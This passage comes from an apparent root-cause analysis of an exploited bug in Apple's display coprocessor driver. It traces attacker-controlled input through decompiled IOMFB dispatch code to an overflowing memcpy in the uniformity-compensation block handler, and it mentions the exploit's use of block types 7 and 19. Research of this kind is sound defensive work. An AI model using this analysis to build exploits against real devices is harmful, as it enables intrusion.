 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br><a id="t.6497588dbb4a0e06e642bb1567a0fe45e731eabb"></a><a id="t.21"></a><table class="HovzfPYjjR-c20"><tr class="HovzfPYjjR-c18"><td class="HovzfPYjjR-c13" colspan="1" rowspan="1">
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">IOMFB</span><span class="HovzfPYjjR-c1">::</span><span class="HovzfPYjjR-c14">MemDescRelay</span><span class="HovzfPYjjR-c1">::</span><span class="HovzfPYjjR-c0">withAddressRange</span><span class="HovzfPYjjR-c1">(</span><span class="HovzfPYjjR-c9">unsigned</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c9">long</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c9">long</span><span class="HovzfPYjjR-c1">,</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c9">unsigned</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c9">long</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c9">long</span><span class="HovzfPYjjR-c1">,</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c9">unsigned</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c9">int</span><span class="HovzfPYjjR-c1">,</span><span class="HovzfPYjjR-c0">&nbsp;task</span><span class="HovzfPYjjR-c1">*,</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c9">unsigned</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c9">long</span><span class="HovzfPYjjR-c1">*,</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c9">unsigned</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c9">long</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c9">long</span><span class="HovzfPYjjR-c1">*)</span></p></td></tr></table>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span>The DCP calls </span><span class="HovzfPYjjR-c7">::prepare</span><span>&nbsp;and </span><span class="HovzfPYjjR-c7">::map</span><span>&nbsp;on the returned </span><span class="HovzfPYjjR-c7">MDES</span><span>&nbsp;object (exactly like an </span><span class="HovzfPYjjR-c7">IOMemoryDescriptor</span><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">&nbsp;object in IOKit), gets the mapped pointer and size to pass via a few final levels of indirection to the block handler:</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br><a id="t.9bfd168ba40a9f143ab7f16183ab117679ba2dbc"></a><a id="t.22"></a><table class="HovzfPYjjR-c20"><tr class="HovzfPYjjR-c18"><td class="HovzfPYjjR-c13" colspan="1" rowspan="1">
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">a_descriptor_with_controlled_stuff</span><span class="HovzfPYjjR-c1">-&gt;</span><span class="HovzfPYjjR-c0">dispatcher_fptr</span><span class="HovzfPYjjR-c1">(</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; a_descriptor_with_controlled_stuff</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; block_type_handler</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; important_ptr</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; important_size</span><span class="HovzfPYjjR-c1">);</span></p></td></tr></table>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span>where the </span><span class="HovzfPYjjR-c7">dispatcher_fptr</span><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">&nbsp;looks like this:</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br><a id="t.acd62f1b5ef2e8ae92523e3f984117951fec44d7"></a><a id="t.23"></a><table class="HovzfPYjjR-c20"><tr class="HovzfPYjjR-c18"><td class="HovzfPYjjR-c13" colspan="1" rowspan="1">
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">a_dispatcher</span><span class="HovzfPYjjR-c1">(</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="HovzfPYjjR-c9">struct</span><span class="HovzfPYjjR-c0">&nbsp;metadispatcher </span><span class="HovzfPYjjR-c1">*</span><span class="HovzfPYjjR-c0">disp</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="HovzfPYjjR-c9">struct</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c14">BlockHandler</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c1">*</span><span class="HovzfPYjjR-c0">block_handler</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; __int64 controlled_ptr</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="HovzfPYjjR-c9">unsigned</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c9">int</span><span class="HovzfPYjjR-c0">&nbsp;controlled_size</span><span class="HovzfPYjjR-c1">)</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c1">{</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; </span><span class="HovzfPYjjR-c9">return</span><span class="HovzfPYjjR-c0">&nbsp;block_handler</span><span class="HovzfPYjjR-c1">-&gt;</span><span class="HovzfPYjjR-c14">BlockHandler_setBlock</span><span class="HovzfPYjjR-c1">(</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;block_handler</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;disp</span><span class="HovzfPYjjR-c1">-&gt;</span><span class="HovzfPYjjR-c0">structure_input_buffer</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;disp</span><span class="HovzfPYjjR-c1">-&gt;</span><span class="HovzfPYjjR-c0">structure_input_size</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;disp</span><span class="HovzfPYjjR-c1">-&gt;</span><span class="HovzfPYjjR-c0">remaining_scalar_inputs</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;disp</span><span class="HovzfPYjjR-c1">-&gt;</span><span class="HovzfPYjjR-c0">cnt_remaining_sclar_input</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;disp</span><span class="HovzfPYjjR-c1">-&gt;</span><span class="HovzfPYjjR-c0">handlers_holder</span><span class="HovzfPYjjR-c1">-&gt;</span><span class="HovzfPYjjR-c0">gate</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;controlled_ptr</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;controlled_size</span><span class="HovzfPYjjR-c1">);</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c1">}</span></p></td></tr></table>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">You can see here just how useful it is to keep making structure definitions while reversing; there are so many levels of indirection that it's pretty much impossible to keep it all in your head.</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span class="HovzfPYjjR-c7">BlockHandler_setBlock</span><span>&nbsp;is a virtual method on </span><span class="HovzfPYjjR-c7">BLHA</span><span>.</span><span>&nbsp;This is the implementation for </span><span class="HovzfPYjjR-c7">BLHA</span><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">&nbsp;19:</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br><a id="t.54f6196429ae58c591e0fbda962486be871b857c"></a><a id="t.24"></a><table class="HovzfPYjjR-c20"><tr class="HovzfPYjjR-c18"><td class="HovzfPYjjR-c13" colspan="1" rowspan="1">
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c14">BlockHandler19</span><span class="HovzfPYjjR-c1">::</span><span class="HovzfPYjjR-c0">setBlock</span><span class="HovzfPYjjR-c1">(</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; </span><span class="HovzfPYjjR-c9">struct</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c14">BlockHandler</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c1">*</span><span class="HovzfPYjjR-c9">this</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; </span><span class="HovzfPYjjR-c9">void</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c1">*</span><span class="HovzfPYjjR-c0">structure_input_buffer</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; int64 structure_input_size</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; int64 </span><span class="HovzfPYjjR-c1">*</span><span class="HovzfPYjjR-c0">remaining_scalar_inputs</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; </span><span class="HovzfPYjjR-c9">unsigned</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c9">int</span><span class="HovzfPYjjR-c0">&nbsp;cnt_remaining_scalar_inputs</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; </span><span class="HovzfPYjjR-c9">struct</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c14">CommandGate</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c1">*</span><span class="HovzfPYjjR-c0">gate</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; </span><span class="HovzfPYjjR-c9">void</span><span class="HovzfPYjjR-c1">*</span><span class="HovzfPYjjR-c0">&nbsp;mapped_mdesc_ptr</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; </span><span class="HovzfPYjjR-c9">unsigned</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c9">int</span><span class="HovzfPYjjR-c0">&nbsp;mapped_mdesc_length</span><span class="HovzfPYjjR-c1">)</span></p></td></tr></table>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span>This uses a Command Gate (</span><span class="HovzfPYjjR-c7">GATI</span><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">) object (like a call gate in IOKit to serialise calls) to finally get close to actually calling the setBlock_Impl function.</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span>We need to reverse the </span><span class="HovzfPYjjR-c7">gate_context</span><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">&nbsp;structure to follow the controlled data through the gate:</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br><a id="t.ecbfc354e58e0a03f109ff9486e9e7688b91b2e0"></a><a id="t.25"></a><table class="HovzfPYjjR-c20"><tr class="HovzfPYjjR-c18"><td class="HovzfPYjjR-c13" colspan="1" rowspan="1">
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c9">struct</span><span class="HovzfPYjjR-c0">&nbsp;__attribute__</span><span class="HovzfPYjjR-c1">((</span><span class="HovzfPYjjR-c0">aligned</span><span class="HovzfPYjjR-c1">(</span><span class="HovzfPYjjR-c4">8</span><span class="HovzfPYjjR-c1">)))</span><span class="HovzfPYjjR-c0 HovzfPYjjR-c2">&nbsp;gate_context</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c1">{</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c9">struct</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c14">BlockHandler</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c1">*</span><span class="HovzfPYjjR-c0">the_target_this</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp;uint64_t structure_input_buffer</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c9">void</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c1">*</span><span class="HovzfPYjjR-c0">remaining_scalar_inputs</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp;uint32_t cnt_remaining_scalar_inputs</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp;uint32_t field_28</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp;uint64_t controlled_ptr</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp;uint32_t controlled_length</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c1">};</span></p></td></tr></table>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">The callgate object uses that context object to finally call the BLHA setBlock handler:</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br><a id="t.af3652c5bd10314e902473b353a7422786c1de2f"></a><a id="t.26"></a><table class="HovzfPYjjR-c20"><tr class="HovzfPYjjR-c18"><td class="HovzfPYjjR-c13" colspan="1" rowspan="1">
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">callback_used_by_callgate_in_block_19_setBlock</span><span class="HovzfPYjjR-c1">(</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; </span><span class="HovzfPYjjR-c9">struct</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c14">UnifiedPipeline</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c1">*</span><span class="HovzfPYjjR-c0">parent_pipeline</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; </span><span class="HovzfPYjjR-c9">struct</span><span class="HovzfPYjjR-c0">&nbsp;gate_context </span><span class="HovzfPYjjR-c1">*</span><span class="HovzfPYjjR-c0">context</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; int64 a3</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; int64 a4</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; int64 a5</span><span class="HovzfPYjjR-c1">)</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c1">{</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; </span><span class="HovzfPYjjR-c9">return</span><span class="HovzfPYjjR-c0">&nbsp;context</span><span class="HovzfPYjjR-c1">-&gt;</span><span class="HovzfPYjjR-c0">the_target_this</span><span class="HovzfPYjjR-c1">-&gt;</span><span class="HovzfPYjjR-c0">setBlock_Impl</span><span class="HovzfPYjjR-c1">)(</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;context</span><span class="HovzfPYjjR-c1">-&gt;</span><span class="HovzfPYjjR-c0">the_target_this</span><span class="HovzfPYjjR-c1">-&gt;</span><span class="HovzfPYjjR-c0">back_ptr_to_UPPipeDCP_H13P</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;context</span><span class="HovzfPYjjR-c1">-&gt;</span><span class="HovzfPYjjR-c0">structure_input_buffer</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;context</span><span class="HovzfPYjjR-c1">-&gt;</span><span class="HovzfPYjjR-c0">remaining_scalar_inputs</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;context</span><span class="HovzfPYjjR-c1">-&gt;</span><span class="HovzfPYjjR-c0">cnt_remaining_scalar_inputs</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;context</span><span class="HovzfPYjjR-c1">-&gt;</span><span class="HovzfPYjjR-c0">controlled_ptr</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;context</span><span class="HovzfPYjjR-c1">-&gt;</span><span class="HovzfPYjjR-c0">controlled_length</span><span class="HovzfPYjjR-c1">);</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c1">}</span></p></td></tr></table><h2 class="HovzfPYjjR-c15 HovzfPYjjR-c8" id="h.3xz0wc9abhwz"><span class="HovzfPYjjR-c16 HovzfPYjjR-c2">SetBlock_Impl</span></h2>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span>And finally we've made it through the whole callstack following the controlled data from </span><span class="HovzfPYjjR-c7">IOConnectCallMethod</span><span>&nbsp;in userspace on the AP to the </span><span class="HovzfPYjjR-c7">setBlock_Impl</span><span>&nbsp;methods on the DCP!</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span>The prototype of the </span><span class="HovzfPYjjR-c7">setBlock_Impl</span><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">&nbsp;methods looks like this:</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br><a id="t.ce1b657ebc4685a8be9f9a3720b828c0f9a2d7ce"></a><a id="t.27"></a><table class="HovzfPYjjR-c20"><tr class="HovzfPYjjR-c18"><td class="HovzfPYjjR-c13" colspan="1" rowspan="1">
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">setBlock_Impl</span><span class="HovzfPYjjR-c1">(</span><span class="HovzfPYjjR-c9">struct</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c14">UPPipeDCP_H13P</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c1">*</span><span class="HovzfPYjjR-c0">pipe_parent</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="HovzfPYjjR-c9">void</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c1">*</span><span class="HovzfPYjjR-c0">structure_input_buffer</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="HovzfPYjjR-c9">int</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c1">*</span><span class="HovzfPYjjR-c0">remaining_scalar_inputs</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="HovzfPYjjR-c9">int</span><span class="HovzfPYjjR-c0">&nbsp;cnt_remaining_scalar_inputs</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="HovzfPYjjR-c9">void</span><span class="HovzfPYjjR-c1">*</span><span class="HovzfPYjjR-c0">&nbsp;ptr_via_memdesc</span><span class="HovzfPYjjR-c1">,</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="HovzfPYjjR-c9">unsigned</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c9">int</span><span class="HovzfPYjjR-c0">&nbsp;len_of_memdesc_mapped_buf</span><span class="HovzfPYjjR-c1">)</span></p></td></tr></table>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span>The exploit calls two </span><span class="HovzfPYjjR-c7">setBlock_Impl</span><span>&nbsp;methods; </span><span class="HovzfPYjjR-c7">7</span><span>&nbsp;and </span><span class="HovzfPYjjR-c7">19</span><span>. 7 is fairly simple and seems to just be used to put controlled data in a known location. 19 is the buggy one. From the log strings we can tell that block type 19 handler is implemented in a file called </span><span class="HovzfPYjjR-c7">UniformityCompensator.cpp</span><span class="HovzfPYjjR-c5 HovzfPYjjR-c2">.</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c5 HovzfPYjjR-c2"></span></p><br>
 <p class="HovzfPYjjR-c3 HovzfPYjjR-c8"><span class="HovzfPYjjR-c17"><a class="HovzfPYjjR-c191" href="https://www.benq.com/en-us/knowledge-center/knowledge/screen-uniformity.html">Uniformity Compensation</a></span><span>&nbsp;is a way to correct for inconsistencies in brightness and colour reproduction across a display panel. Block type 19 sets and gets a data structure containing this correction information. The </span><span class="HovzfPYjjR-c7">setBlock_Impl</span><span>&nbsp;method calls </span><span class="HovzfPYjjR-c7">UniformityCompensator::set</span><span>&nbsp;and reaches the following code snippet where </span><span class="HovzfPYjjR-c7">controlled_size</span><span>&nbsp;is a fully-controlled u32 value read from the structure input and </span><span class="HovzfPYjjR-c7">indirect_buffer_ptr</span><span>&nbsp;points to the mapped buffer, the contents of which are also controlled:</span></p>
 <p class="c3 c8 c10"><span class="HovzfPYjjR-c6 HovzfPYjjR-c2"></span></p><a id="t.7beb7cf889ce845693bd09783570df3d7b3034d3"></a><a id="t.28"></a><table class="HovzfPYjjR-c20"><tr class="HovzfPYjjR-c18"><td class="HovzfPYjjR-c13" colspan="1" rowspan="1">
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">uint8_t</span><span class="HovzfPYjjR-c1">*</span><span class="HovzfPYjjR-c0">&nbsp;pages </span><span class="HovzfPYjjR-c1">=</span><span class="HovzfPYjjR-c0">&nbsp;compensator</span><span class="HovzfPYjjR-c1">-&gt;</span><span class="HovzfPYjjR-c0">inline_buffer</span><span class="HovzfPYjjR-c1">;</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c30">// +0x24</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c9">for</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c1">(</span><span class="HovzfPYjjR-c9">int</span><span class="HovzfPYjjR-c0">&nbsp;pg_cnt </span><span class="HovzfPYjjR-c1">=</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c4">0</span><span class="HovzfPYjjR-c1">;</span><span class="HovzfPYjjR-c0">&nbsp;pg_cnt </span><span class="HovzfPYjjR-c1">&lt;</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c4">3</span><span class="HovzfPYjjR-c1">;</span><span class="HovzfPYjjR-c0">&nbsp;pg_cnt</span><span class="HovzfPYjjR-c1">++)</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c1">{</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; uint8_t</span><span class="HovzfPYjjR-c1">*</span><span class="HovzfPYjjR-c0">&nbsp;this_page </span><span class="HovzfPYjjR-c1">=</span><span class="HovzfPYjjR-c0">&nbsp;pages</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; </span><span class="HovzfPYjjR-c9">for</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c1">(</span><span class="HovzfPYjjR-c9">int</span><span class="HovzfPYjjR-c0">&nbsp;i </span><span class="HovzfPYjjR-c1">=</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c4">0</span><span class="HovzfPYjjR-c1">;</span><span class="HovzfPYjjR-c0">&nbsp;i </span><span class="HovzfPYjjR-c1">&lt;</span><span class="HovzfPYjjR-c0">&nbsp;controlled_size</span><span class="HovzfPYjjR-c1">;</span><span class="HovzfPYjjR-c0">&nbsp;i</span><span class="HovzfPYjjR-c1">++)</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c1">{</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; memcpy</span><span class="HovzfPYjjR-c1">(</span><span class="HovzfPYjjR-c0">this_page</span><span class="HovzfPYjjR-c1">,</span><span class="HovzfPYjjR-c0">&nbsp;indirect_buffer_ptr</span><span class="HovzfPYjjR-c1">,</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c4">4</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c1">*</span><span class="HovzfPYjjR-c0">&nbsp;controlled_size</span><span class="HovzfPYjjR-c1">);</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; indirect_buffer_ptr </span><span class="HovzfPYjjR-c1">+=</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c4">4</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c1">*</span><span class="HovzfPYjjR-c0">&nbsp;controlled_size</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; &nbsp; this_page </span><span class="HovzfPYjjR-c1">+=</span><span class="HovzfPYjjR-c0">&nbsp;</span><span class="HovzfPYjjR-c4">0x100</span><span class="HovzfPYjjR-c1">;</span></p>
 <p class="HovzfPYjjR-c3"><span class="HovzfPYjjR-c0">&nbsp; </span><span class="HovzfPYjjR-c1">}</span></p>
